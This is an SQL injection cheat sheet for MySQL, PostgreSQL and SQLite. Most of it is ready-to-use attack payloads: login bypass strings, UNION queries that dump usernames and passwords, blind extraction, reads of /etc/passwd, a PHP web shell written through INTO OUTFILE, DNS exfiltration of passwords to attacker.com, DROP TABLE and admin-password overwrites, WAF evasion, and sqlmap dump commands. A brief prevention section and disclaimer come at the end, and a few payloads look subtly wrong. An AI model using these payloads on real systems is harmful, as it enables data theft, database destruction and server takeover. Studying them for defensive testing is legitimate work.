# SQL Injection Cheat Sheet - MySQL, PostgreSQL, SQLite

## Daftar Isi
1. [Deteksi SQL Injection](#deteksi)
2. [MySQL](#mysql)
3. [PostgreSQL](#postgresql)
4. [SQLite](#sqlite)
5. [Blind SQL Injection](#blind)
6. [Advanced Techniques](#advanced)
7. [WAF Bypass](#waf-bypass)

---

## 1. DETECTING SQL INJECTION {#deteksi}

### Basic Tests
```sql
' OR '1'='1
' OR 1=1--
' OR 1=1#
' OR 1=1/*
' OR '1'='1'--
" OR "1"="1
" OR 1=1--
' OR 1=1 AND 1=1--
' OR 1=1 AND 1=2--
```

### Error-Based Detection
```sql
'
''
"
' AND 1=1--
' AND 1=2--
' OR '1'='1
' OR '1'='1'--
' OR '1'='1'/*
' OR 1=1--
' OR 1=1#
```

### Time-Based Detection
```sql
' OR SLEEP(5)--
' OR pg_sleep(5)--
' OR (SELECT SLEEP(5))--
' AND (SELECT SLEEP(5))--
```

## 2. MYSQL {#mysql}

### Database Information
```sql
-- Version
' UNION SELECT @@version--
' UNION SELECT VERSION()--

-- Current Database
' UNION SELECT DATABASE()--
' UNION SELECT SCHEMA()--

-- Current User
' UNION SELECT USER()--
' UNION SELECT CURRENT_USER()--

-- All Databases
' UNION SELECT GROUP_CONCAT(schema_name) FROM information_schema.schemata--

-- Hostname
' UNION SELECT @@hostname--
' UNION SELECT @@server_id--
```

### Table Information
```sql
-- Get all tables
' UNION SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=DATABASE()--

-- Get tables with column count
' UNION SELECT table_name, COUNT(*) FROM information_schema.columns GROUP BY table_name--

-- Get specific table columns
' UNION SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='users'--

-- Get table structure
' UNION SELECT GROUP_CONCAT(COLUMN_NAME) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='users'--
```

### Column Information
```sql
-- Get columns for a table
' UNION SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='users'--

-- Get column types
' UNION SELECT COLUMN_NAME, DATA_TYPE FROM information_schema.columns WHERE table_name='users'--

-- Get all columns from all tables
' UNION SELECT GROUP_CONCAT(table_name || '.' || column_name) FROM information_schema.columns--
```

### Data Extraction
```sql
-- Basic UNION
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--

-- Extract data with concat
' UNION SELECT CONCAT(username, ':', password) FROM users--

-- Extract multiple columns
' UNION SELECT username, password FROM users--

-- Extract with group_concat
' UNION SELECT GROUP_CONCAT(username || ':' || password) FROM users--

-- Extract specific data
' UNION SELECT column_name FROM table_name WHERE condition--
```

### File Operations (MySQL)
```sql
-- Read file
' UNION SELECT LOAD_FILE('/etc/passwd')--

-- Write file
' UNION SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php'--

-- Check file permissions
' UNION SELECT file_priv FROM mysql.user WHERE user='root'--
```

### MySQL Specific Functions
```sql
-- String functions
SUBSTRING(string, start, length)
SUBSTR(string, start, length)
MID(string, start, length)
LEFT(string, length)
RIGHT(string, length)
LENGTH(string)
CHAR_LENGTH(string)

-- Conversion
CAST(column AS type)
CONVERT(column, type)

-- Hashing
MD5(string)
SHA1(string)
SHA2(string, hash_length)

-- JSON (MySQL 5.7+)
JSON_EXTRACT(json, path)
JSON_VALUE(json, path)
```

## 3. POSTGRESQL {#postgresql}

### Database Information
```sql
-- Version
' UNION SELECT version()--
' UNION SELECT current_setting('server_version')--

-- Current Database
' UNION SELECT current_database()--

-- Current User
' UNION SELECT current_user--
' UNION SELECT session_user--

-- All Databases
' UNION SELECT datname FROM pg_database--

-- Hostname
' UNION SELECT inet_server_addr()--
' UNION SELECT hostname()--
```

### Table Information
```sql
-- Get all tables
' UNION SELECT table_name FROM information_schema.tables WHERE table_schema='public'--

-- Get tables with column count
' UNION SELECT table_name, COUNT(*) FROM information_schema.columns GROUP BY table_name--

-- Get specific table columns
' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--

-- Get table structure (PostgreSQL)
' UNION SELECT column_name, data_type FROM information_schema.columns WHERE table_name='users'--

-- Alternative table list
' UNION SELECT relname FROM pg_stat_user_tables--
```

### Column Information
```sql
-- Get columns for a table
' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--

-- Get column types
' UNION SELECT column_name, data_type FROM information_schema.columns WHERE table_name='users'--

-- Get all columns from all tables
' UNION SELECT table_name || '.' || column_name FROM information_schema.columns--
```

### Data Extraction
```sql
-- Basic UNION (PostgreSQL requires column count match)
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--

-- Extract with concat
' UNION SELECT username || ':' || password FROM users--

-- Extract multiple columns
' UNION SELECT username, password FROM users--

-- Extract with string_agg
' UNION SELECT string_agg(username || ':' || password, ',') FROM users--

-- Extract with array_agg
' UNION SELECT array_to_string(array_agg(username || ':' || password), ',') FROM users--

-- Extract specific data
' UNION SELECT column_name FROM table_name WHERE condition--
```

### PostgreSQL Specific Functions
```sql
-- String functions
SUBSTRING(string FROM pattern)
SUBSTR(string, start, length)
LEFT(string, length)
RIGHT(string, length)
LENGTH(string)
CHAR_LENGTH(string)

-- Array functions
ARRAY_AGG(column)
STRING_TO_ARRAY(string, delimiter)
UNNEST(array)

-- JSON functions
JSONB_AGG(column)
JSONB_BUILD_OBJECT(column)

-- Hashing
MD5(string)
ENCODE(string, 'hex')
```

### File Operations (PostgreSQL)
```sql
-- Read file (requires superuser)
' UNION SELECT pg_read_file('/etc/passwd')--

-- Read file with specific offset
' UNION SELECT pg_read_file('/etc/passwd', 0, 1000)--

-- Write file (requires superuser)
' UNION SELECT lo_export('/var/www/html/shell.php', lo_import('/tmp/shell.php'))--

-- List directory
' UNION SELECT pg_ls_dir('/var/www/html')--
```

### PostgreSQL Advanced
```sql
-- Command execution (superuser required)
' UNION SELECT pg_exec('id')--

-- DNS exfiltration
' UNION SELECT dblink_connect('host='||(SELECT password FROM users LIMIT 1)||'.attacker.com')--

-- Heap injection
' UNION SELECT * FROM pg_sleep(5)--
```

## 4. SQLITE {#sqlite}

### Database Information
```sql
-- Version
' UNION SELECT sqlite_version()--

-- Current Database
' UNION SELECT filepath FROM pragma_database_list--

-- All Databases
' UNION SELECT name FROM pragma_database_list--

-- Check if sqlite_master exists
' UNION SELECT name FROM sqlite_master WHERE type='table'--
```

### Table Information
```sql
-- Get all tables
' UNION SELECT GROUP_CONCAT(name) FROM sqlite_master WHERE type='table'--

-- Get specific table structure
' UNION SELECT sql FROM sqlite_master WHERE type='table' AND name='users'--

-- Get table info (columns)
' UNION SELECT sql FROM sqlite_master WHERE type='table' AND name='users'--

-- Alternative table list
' UNION SELECT name FROM sqlite_master WHERE type='table' AND name NOT LIKE 'sqlite_%'--
```

### Column Information
```sql
-- Get columns for a table (using PRAGMA)
' UNION SELECT name FROM pragma_table_info('users')--

-- Get column types
' UNION SELECT name, type FROM pragma_table_info('users')--

-- Get all columns info
' UNION SELECT GROUP_CONCAT(name || ':' || type) FROM pragma_table_info('users')--

-- Get columns with SQL
' UNION SELECT sql FROM sqlite_master WHERE tbl_name='users' AND type='table'--
```

### Data Extraction
```sql
-- Basic UNION
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--

-- Extract with concatenation
' UNION SELECT username || ':' || password FROM users--

-- Extract multiple columns
' UNION SELECT username, password FROM users--

-- Extract with group_concat
' UNION SELECT GROUP_CONCAT(username || ':' || password) FROM users--

-- Extract specific data
' UNION SELECT column_name FROM table_name WHERE condition--

-- Extract with WHERE condition
' UNION SELECT username FROM users WHERE id=1--
```

### SQLite Specific Functions
```sql
-- String functions
SUBSTR(string, start, length)
LENGTH(string)
REPLACE(string, pattern, replacement)
UPPER(string)
LOWER(string)
TRIM(string)

-- Type conversion
CAST(column AS TEXT)
CAST(column AS INTEGER)
CAST(column AS REAL)

-- Date functions
DATETIME('now')
DATE('now')
TIME('now')
JULIANDAY('now')

-- Group functions
GROUP_CONCAT(column)
GROUP_CONCAT(column, separator)

-- Aggregate
COUNT(*)
MAX(column)
MIN(column)
SUM(column)
AVG(column)
```

### SQLite File Operations
```sql
-- Attach database
' UNION SELECT sql FROM sqlite_master WHERE type='table'-- ATTACH DATABASE '/etc/passwd' AS passwd--

-- Read file (via SQL injection)
' UNION SELECT load_extension('/path/to/extension')--

-- Write file (via SQLite extensions)
' UNION SELECT load_extension('/path/to/write.so', 'write_file')--

-- List tables with content
' UNION SELECT sql FROM sqlite_master WHERE type='table' AND name NOT LIKE 'sqlite_%'--
```

### SQLite Advanced
```sql
-- Recursive CTE (for data extraction)
' UNION WITH RECURSIVE cnt(x) AS (VALUES(1) UNION ALL SELECT x+1 FROM cnt WHERE x<10) SELECT x FROM cnt--

-- Subquery with joins
' UNION SELECT a.name, b.name FROM sqlite_master a JOIN pragma_table_info(a.name) b--

-- Dynamic SQL
' UNION SELECT sql FROM sqlite_master WHERE type='table' AND sql LIKE '%flag%'--

-- Check if table exists
' UNION SELECT name FROM sqlite_master WHERE type='table' AND name='flag'--

-- Get row count
' UNION SELECT COUNT(*) FROM users--
```

## 5. BLIND SQL INJECTION {#blind}

### Boolean-Based Blind
```sql
-- MySQL
' AND 1=1--
' AND 1=2--
' AND (SELECT 1 FROM users LIMIT 1)=1--
' AND (SELECT LENGTH(password) FROM users WHERE id=1)>5--

-- PostgreSQL
' AND 1=1--
' AND 1=2--
' AND (SELECT 1 FROM users LIMIT 1)=1--
' AND (SELECT LENGTH(password) FROM users WHERE id=1)>5--

-- SQLite
' AND 1=1--
' AND 1=2--
' AND (SELECT 1 FROM users LIMIT 1)=1--
' AND (SELECT LENGTH(password) FROM users WHERE id=1)>5--
```

### Time-Based Blind
```sql
-- MySQL
' AND SLEEP(5)--
' AND (SELECT SLEEP(5))--
' AND (SELECT BENCHMARK(5000000, MD5('test')))--

-- PostgreSQL
' AND pg_sleep(5)--
' AND (SELECT pg_sleep(5))--

-- SQLite
' AND (SELECT RANDOM())=(SELECT RANDOM())--
' AND (SELECT sleep(5))--  (requires extension)
```

### Substring Extraction (Boolean)
```sql
-- MySQL
' AND SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a'--
' AND MID((SELECT password FROM users LIMIT 1),1,1)='a'--
' AND LEFT((SELECT password FROM users LIMIT 1),1)='a'--

-- PostgreSQL
' AND SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a'--
' AND SUBSTR((SELECT password FROM users LIMIT 1),1,1)='a'--

-- SQLite
' AND SUBSTR((SELECT password FROM users LIMIT 1),1,1)='a'--
' AND (SELECT SUBSTR(password,1,1) FROM users LIMIT 1)='a'--
```

### Character by Character Extraction
```sql
-- MySQL
' AND (SELECT password FROM users LIMIT 1) LIKE 'a%'--
' AND (SELECT password FROM users LIMIT 1) LIKE 'a_%'--

-- PostgreSQL
' AND (SELECT password FROM users LIMIT 1) LIKE 'a%'--
' AND (SELECT password FROM users LIMIT 1) SIMILAR TO 'a%'--

-- SQLite
' AND (SELECT password FROM users LIMIT 1) LIKE 'a%'--
' AND (SELECT password FROM users LIMIT 1) GLOB 'a*'--
```

### Bitwise Extraction
```sql
-- MySQL
' AND (SELECT ASCII(SUBSTRING(password,1,1)) FROM users LIMIT 1) & 1=1--

-- PostgreSQL
' AND (SELECT ASCII(SUBSTRING(password,1,1)) FROM users LIMIT 1) & 1=1--

-- SQLite
' AND (SELECT UNICODE(SUBSTR(password,1,1)) FROM users LIMIT 1) & 1=1--
```

## 6. ADVANCED TECHNIQUES {#advanced}

### Second-Order Injection
```sql
-- Register with payload
Username: admin' OR '1'='1
Password: test

-- Later in another query
SELECT * FROM users WHERE username='admin' OR '1'='1' AND password='test'
```

### Stacked Queries
```sql
-- MySQL (requires mysqli_multi_query)
'; DROP TABLE users;--
'; INSERT INTO users VALUES('hacker','password');--
'; UPDATE users SET password='hacked' WHERE username='admin';--

-- PostgreSQL
'; DROP TABLE users;--
'; INSERT INTO users VALUES('hacker','password');--

-- SQLite
'; DROP TABLE users;--
'; INSERT INTO users VALUES('hacker','password');--
```

### Out-of-Band (OOB) Injection
```sql
-- MySQL (DNS exfiltration)
' AND LOAD_FILE(CONCAT('\\\\',(SELECT password FROM users LIMIT 1),'.attacker.com\\a'))--

-- PostgreSQL (DNS exfiltration)
' AND (SELECT dblink_connect('host='||(SELECT password FROM users LIMIT 1)||'.attacker.com'))--

-- SQLite (requires extension)
' AND (SELECT load_extension('/path/to/oob.so'))--
```

### JSON-Based Injection
```sql
-- MySQL (5.7+)
' AND JSON_EXTRACT('{"key":"value"}', '$.key')='value'--

-- PostgreSQL
' AND jsonb_extract_path('{"key":"value"}', 'key')='"value"'--

-- SQLite (JSON1 extension)
' AND json_extract('{"key":"value"}', '$.key')='value'--
```

### XML-Based Injection
```sql
-- MySQL
' AND ExtractValue('<a>b</a>', '/a')='b'--
' AND UpdateXML('<a><b>c</b></a>', '/a/b', 'd')--

-- PostgreSQL
' AND xpath('/a/text()', '<a>b</a>')='b'--
' AND XMLSERIALIZE(DOCUMENT '<a>b</a>' AS TEXT)='b'--

-- SQLite
' AND xml('1')--
```

### Wildcard Column Discovery
```sql
-- MySQL
' UNION SELECT * FROM users--
' UNION SELECT 1,2,3,4,5,6,7,8,9,10 FROM users--

-- PostgreSQL
' UNION SELECT * FROM users--
' UNION SELECT 1,2,3,4,5,6,7,8,9,10 FROM users--

-- SQLite
' UNION SELECT * FROM users--
' UNION SELECT 1,2,3,4,5,6,7,8,9,10 FROM users--
```

### Password Hash Cracking
```sql
-- Get hash first
' UNION SELECT password FROM users WHERE username='admin'--

-- Then crack with tools
-- John the Ripper: john --format=raw-md5 hash.txt
-- Hashcat: hashcat -m 0 hash.txt wordlist.txt
```

## 7. WAF BYPASS {#waf-bypass}

### Encoding Bypass
```sql
-- URL Encoding
%27 => '
%20 => space
%2F => /
%25 => %

-- Double URL Encoding
%2527 => '
%2520 => space

-- Unicode Encoding
%u0027 => '
%u006f => o

-- Hex Encoding
0x27 => '
0x20 => space

-- MySQL Specific
\x27 => '
\x20 => space
```

### Comment Bypass
```sql
-- Standard
/**/
/*!*/
# (MySQL)
-- (MySQL, PostgreSQL, SQLite)
%00 (NULL byte)

-- Nested Comments
/*!/*!*/
/**/OR/**/1=1/**/

-- MySQL Conditional Comments
/*!50000 OR 1=1*/
/*!40100 OR 1=1*/
```

### Whitespace Bypass
```sql
-- Without Spaces
'OR'1'='1
'OR+1=1
'OR/**/1=1

-- Tabs and Newlines
' OR\t1=1
' OR\n1=1
' OR\r\n1=1

-- Alternative Whitespace
'%0aOR%0a1=1
'%0dOR%0d1=1
'%09OR%091=1
```

### Case Manipulation
```sql
-- Mix Case
'oR'1'='1
'OR'1'='1
'Or'1'='1

-- Alternate Case
'UnIoN' 'SeLeCt'
'UnIoN'/**/'SeLeCt'
```

### Keyword Bypass
```sql
-- Double Keywords
'UNION UNION SELECT--
'UNION/**/SELECT--
'UNION%0aSELECT--

-- MySQL Special
'/*!UNION*/ /*!SELECT*/--
'/*!50000UNION*/ /*!50000SELECT*/--

-- PostgreSQL
'UNION ALL SELECT--
'UNION DISTINCT SELECT--
```

### Comparison Bypass
```sql
-- Alternatives to =
' OR 1 LIKE 1--
' OR 1 IN (1)--
' OR 1 BETWEEN 0 AND 2--
' OR 1>0--
' OR 1<2--
' OR 1!=0--
' OR 1<>0--

-- PostgreSQL
' OR 1 SIMILAR TO 1--
' OR 1 ILIKE 1--
```

### Function Bypass
```sql
-- MySQL
CONCAT() => CONCAT_WS() => GROUP_CONCAT()
SUBSTRING() => SUBSTR() => MID()
ASCII() => ORD()
DATABASE() => SCHEMA()

-- PostgreSQL
CONCAT() => CONCAT_WS() => STRING_AGG()
SUBSTRING() => SUBSTR()
ASCII() => ASCII()
```

### Advanced Bypass Examples
```sql
-- MySQL Information Schema Bypass
information_schema.tables
INFORMATION_SCHEMA.TABLES
INFORMATION_SCHEMA.tables
`INFORMATION_SCHEMA`.`TABLES`

-- Table Name Bypass
users
`users`
"users"
[users]

-- Column Name Bypass
password
`password`
"password"
[password]
```

## 8. TOOLS & RESOURCES

### Tools
```bash
# SQLMap
sqlmap -u "http://target.com/page?id=1" --dbs
sqlmap -u "http://target.com/page?id=1" -D database -T table --dump
sqlmap -u "http://target.com/page?id=1" --sql-shell

# Burp Suite
# - Repeater: Manual testing
# - Intruder: Automated testing
# - Scanner: Automated detection

# jSQL Injection
java -jar jsql-injection.jar

# Havij (Windows)
# SQLi Dumper
```

### Python Script Template
```python
import requests
import string

def blind_extract(url, payload_template):
    """Blind SQL Injection extraction"""
    result = ""
    for i in range(1, 50):
        for char in string.printable:
            payload = payload_template.format(i, char)
            if is_true(payload):
                result += char
                print(f"[+] Result: {result}")
                break
    return result

def is_true(payload):
    """Check if condition is true"""
    # Implement based on response
    pass
```

### Useful Resources
- SQL Injection Cheat Sheet
- PayloadsAllTheThings
- SQLMap Wiki
- PortSwigger SQL Injection

## 9. COMMON PAYLOADS

### Authentication Bypass
```sql
-- Universal Bypass
' OR 1=1--
' OR 1=1#
' OR '1'='1
' OR '1'='1'--
" OR "1"="1
" OR 1=1--
' OR 1=1 AND 1=1--
' OR 1=1 AND 1=2--

-- Admin Bypass
admin' OR '1'='1
admin' OR 1=1--
admin'--
admin'#
admin'/*
admin' AND 1=1--
admin' AND 1=2--
```

### Union Payloads
```sql
-- Find column count
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--

-- Extract data
' UNION SELECT database()--
' UNION SELECT user()--
' UNION SELECT version()--
' UNION SELECT @@version--
```

## 10. PREVENTION

### Parameterized Queries
```python
# Python
cursor.execute("SELECT * FROM users WHERE id = ?", (user_id,))

# PHP
$stmt = $conn->prepare("SELECT * FROM users WHERE id = ?");
$stmt->bind_param("i", $user_id);

# Java
PreparedStatement stmt = conn.prepareStatement("SELECT * FROM users WHERE id = ?");
stmt.setInt(1, user_id);
```

### Input Validation
```python
# Whitelist Validation
if not user_id.isdigit():
    raise ValueError("Invalid input")

# Type Casting
user_id = int(user_id)

# Length Limitation
if len(username) > 50:
    raise ValueError("Username too long")
```

### Escaping
```python
# MySQL
escaped = connection.escape_string(input)

# PostgreSQL
escaped = connection.escape_string(input)

# SQLite
escaped = connection.execute("SELECT quote(?)", (input,)).fetchone()[0]
```

## 11. QUICK REFERENCE TABLE

| Feature | MySQL | PostgreSQL | SQLite |
|---|---|---|---|
| Version | @@version | version() | sqlite_version() |
| Database | DATABASE() | current_database() | filepath (PRAGMA) |
| User | USER() | current_user | N/A |
| Tables | information_schema.tables | information_schema.tables | sqlite_master |
| Columns | information_schema.columns | information_schema.columns | pragma_table_info() |
| Concat | CONCAT() | \|\| or CONCAT() | \|\| |
| Group Concat | GROUP_CONCAT() | STRING_AGG() | GROUP_CONCAT() |
| Substring | SUBSTRING()/SUBSTR() | SUBSTRING()/SUBSTR() | SUBSTR() |
| Sleep | SLEEP() | pg_sleep() | sleep() (with ext) |
| Comments | -- # /* */ | -- /* */ | -- /* */ |
| File Read | LOAD_FILE() | pg_read_file() | readfile() (ext) |
| File Write | INTO OUTFILE | COPY | N/A |

## 12. EMERGENCY PAYLOADS

### When Nothing Works
```sql
-- Try basic error
'

-- Try comment
'--

-- Try OR
' OR 1=1--

-- Try AND
' AND 1=1--

-- Try Union
' UNION SELECT NULL--

-- Try Stacked
'; SELECT 1--

-- Try Time-based
' AND SLEEP(5)--
```

### Debugging Tips
- Check for error messages
- Try different input locations (URL, headers, cookies)
- Test without ' (numeric injection)
- Try double quotes (")
- Check for WAF (try encoding)
- Test with SQLMap's --tamper options

## 13. FINAL NOTES

### Key Points
- Always start with detection - test simple payloads first
- Know your database - different databases have different syntax
- Use proper tools - SQLMap, Burp Suite, etc.
- Be patient - blind injection takes time
- Document findings - keep track of what works

### Legal Disclaimer
```
This cheat sheet is for educational purposes only.
Always obtain proper authorization before testing.
Unauthorized testing may be illegal.
```
